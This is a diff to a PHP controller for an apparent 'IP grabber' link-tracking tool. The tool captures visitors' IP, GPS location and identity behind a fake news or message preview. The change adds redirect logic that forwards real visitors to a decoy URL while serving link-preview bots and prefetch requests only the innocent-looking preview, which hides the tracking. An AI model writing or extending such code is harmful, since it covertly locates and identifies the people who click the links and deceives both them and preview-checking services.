@@ -44,7 +44,7 @@ class IpGrabberController extends Controller
         $captureGps = (bool) $ipGrabber?->capture_gps;
         $captureAlvo = (bool) $ipGrabber?->capture_alvo;
         $captureIdentity = (bool) $ipGrabber?->capture_identity;
-        $redirectUrl = $this->deveRedirecionarParaNoticia($request, $ipGrabber) ? $ipGrabber->noticia_url : null;
+        $redirectUrl = $this->resolverUrlDeRedirecionamento($request, $ipGrabber);
 
         if ($this->requisicaoDePreviewOuPrefetch($request)) {
             return view('pixel.preview', compact('ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
@@ -422,6 +422,27 @@ class IpGrabberController extends Controller
         }
 
         return ! $this->requisicaoDePreviewOuPrefetch($request);
+    }
+
+    private function resolverUrlDeRedirecionamento(Request $request, ?IpGrabber $ipGrabber): ?string
+    {
+        if ($this->deveRedirecionarParaNoticia($request, $ipGrabber)) {
+            return $ipGrabber->noticia_url;
+        }
+
+        if (! $ipGrabber || $ipGrabber->preview_tipo !== 'mensagem' || ! $ipGrabber->redirect_url) {
+            return null;
+        }
+
+        if ($this->modoPreviewManual($request) || ! $request->isMethod('GET')) {
+            return null;
+        }
+
+        if ($this->requisicaoDePreviewOuPrefetch($request)) {
+            return null;
+        }
+
+        return $ipGrabber->redirect_url;
     }
 
     private function requisicaoDePreviewOuPrefetch(Request $request): bool
